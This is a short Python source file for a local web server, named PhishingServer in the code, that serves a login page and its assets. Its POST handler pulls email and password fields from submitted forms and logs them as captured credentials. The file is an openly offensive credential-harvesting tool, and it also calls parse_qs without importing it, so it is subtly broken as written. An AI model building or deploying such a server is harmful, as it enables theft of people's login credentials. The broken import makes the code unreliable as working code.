from http.server import BaseHTTPRequestHandler, HTTPServer
import os

HOST_ADDRESS = 'localhost'
HOST_PORT = 8080

class PhishingServer(BaseHTTPRequestHandler):
    
    def _send_response(self, content, content_type='text/html'):
        self.send_response(200)
        self.send_header('Content-type', content_type)
        self.end_headers()
        self.wfile.write(content.encode('utf-8'))

    def do_GET(self):
        path = self.path
        if path == '/':
            with open('index.html', 'r', encoding='utf-8') as file:
                content = file.read()
            self._send_response(content)
        elif path == '/styles.css':
            with open('styles.css', 'r', encoding='utf-8') as file:
                content = file.read()
            self._send_response(content, content_type='text/css')
        elif path == '/script.js':
            with open('script.js', 'r', encoding='utf-8') as file:
                content = file.read()
            self._send_response(content, content_type='application/javascript')
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')

        # Parse POST data
        params = parse_qs(post_data)
        email = params.get('email', [''])[0]
        password = params.get('password', [''])[0]

        # Log captured information (for demonstration)
        print(f'Email: {email}, Password: {password}')

        self._send_response('Form submitted successfully!')

def run_server():
    server_address = (HOST_ADDRESS, HOST_PORT)
    httpd = HTTPServer(server_address, PhishingServer)
    print(f'Starting phishing server on http://{HOST_ADDRESS}:{HOST_PORT}')
    httpd.serve_forever()

if __name__ == '__main__':
    run_server()
